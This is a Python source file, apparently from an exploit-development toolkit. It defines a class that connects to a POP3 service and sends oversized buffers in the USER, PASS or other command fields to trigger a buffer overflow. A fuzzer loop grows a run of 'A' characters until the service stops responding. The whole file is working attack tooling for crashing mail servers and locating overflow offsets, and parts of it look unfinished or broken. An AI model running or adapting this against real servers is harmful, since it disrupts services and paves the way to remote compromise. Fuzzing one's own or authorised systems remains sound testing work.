import os
import sys
import socket
import time
import getopt
from struct import *
import subprocess
import re
import binascii
from past.builtins import execfile
from protocols import *
from buffers import *
from protocols.tcp import Tcp


class PopSmtp:

    def __init__(self, config):
        self.config = config
        return None

    ############################
    # POP FUNCTIONS

    ############################
    ## POP INJECTION

    def inject(self, remoteip, port, field, buffer, stop_on_field):
        responses = []

        try:

            if (stop_on_field == None):
                stop_on_field = False

            if (self.config.verbose_lv == 2):
                print("BUFFER BEGIN" + ("=" * 100))
                print(buffer)
                print(("=" * 100) + " BUFFER END")

            strlen = str(len(buffer))

            print("[!] Injecting %s bytes" % strlen)
            s = Tcp.connect(remoteip, port)

            if (self.config.verbose_lv == 2):
                print(s)

            if (s == None):
                return responses

            print(s.recv(2048))
            print("[.] Trying to overflow %s ..." % field)

            if (field != "user"):
                print('USER user')
                s.send('USER user\r\n')
            else:
                print('USER [' + strlen + ' bytes]')
                s.send('USER ' + Tcp.prepare_command(buffer.decode('latin-1')) + '\r\n')
            # if(stop_on_field):
            # response = s.recv(2048)
            # print(response)
            # 	s.close()
            # 	return response

            responses.append(s.recv(2048))
            print(responses[-1])

            if (field != "pass"):
                print('PASS pass')
                s.sendall('PASS pass\r\n')
            else:
                print('PASS [' + strlen + ' bytes]')
                s.sendall('PASS ' + Tcp.prepare_command(buffer.decode('latin-1')) + '\r\n')
            # if(stop_on_field):
            # response = s.recv(2048)
            # print(response)
            # 	s.close()
            # 	return response

            responses.append(s.recv(2048))
            print(responses[-1])

            if (field != "user" and field != "pass"):
                print(field + ' [' + strlen + ' bytes]')
                s.sendall(field + ' ' + Tcp.prepare_command(buffer.decode('latin-1')) + '\r\n')

                # if(stop_on_field):
                # response = s.recv(2048)
                # print(response)
                # 	s.close()
                # 	return response
                responses.append(s.recv(2048))
                print(responses[-1])

            s.close()

        except socket.error as error:
            print(error)
            return []

        return responses

    def fuzzer(self, remoteip, port, field, start_size, inc):
        if (inc == None):
            inc = 100

        if (start_size == None):
            size = 100
        else:
            size = start_size

        buffer = "A" * size

        if (field == None):
            field = "user"

        streaming = [True]
        while len(streaming) > 0:

            streaming = (self.inject(remoteip, port, field, buffer, None))

            if (len(streaming) > 0):
                streaming[-1].strip()
                _response = streaming[-1].split(' ')

                # print("[!] ERROR COMMUNICATING TO THE SERVICE " + "|".join(streaming))
                # responsecode = int(_response[0].strip())

                # # 6xx	Protected reply
                # if responsecode > 599:
                # 	print(base64_decode(_response.join(' ')))

                # #5xx	Permanent Negative Completion reply
                # if responsecode > 499:
                # 	return size
                # 	break;

                time.sleep(1)

                size += inc
                buffer = "A" * size

        return size
